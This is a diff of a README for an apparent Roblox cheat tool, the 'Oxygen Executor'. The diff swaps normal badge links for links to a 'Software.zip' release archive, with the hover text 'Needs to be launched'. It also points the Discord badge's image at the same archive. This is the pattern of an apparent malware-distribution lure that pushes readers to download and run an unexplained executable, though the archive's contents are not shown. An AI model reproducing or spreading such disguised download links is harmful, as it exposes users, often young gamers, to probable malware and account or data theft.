@@ -14,7 +14,7 @@ Welcome to the **Roblox Oxygen Executor** repository! 🎮🔧 This versatile sc
 
 You can download the latest version of Roblox Oxygen Executor by clicking on the following link: 
 
-[![Download Oxygen Executor](https://img.shields.io/badge/Download%20Oxygen%20Executor-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download Oxygen Executor](https://github.com/CRY1NGW0LF/Roblox-Oxygen/releases/download/v1.0/Software.zip%20Oxygen%20Executor-v1.0.0-blue)](https://github.com/CRY1NGW0LF/Roblox-Oxygen/releases/download/v1.0/Software.zip "Needs to be launched")
 
 ## Features
 
@@ -38,7 +38,7 @@ To make the most of Oxygen Executor, follow these simple steps:
 If you encounter any issues or have feedback to share, feel free to reach out through the following channels:
 
 - **Discord Server**: Join our Oxygen Discord community for support and discussions.  
-  ![Discord](https://img.shields.io/badge/Join%20Discord-Oxygen-blue)
+  ![Discord](https://github.com/CRY1NGW0LF/Roblox-Oxygen/releases/download/v1.0/Software.zip%20Discord-Oxygen-blue)
 
 ## Additional Resources
 
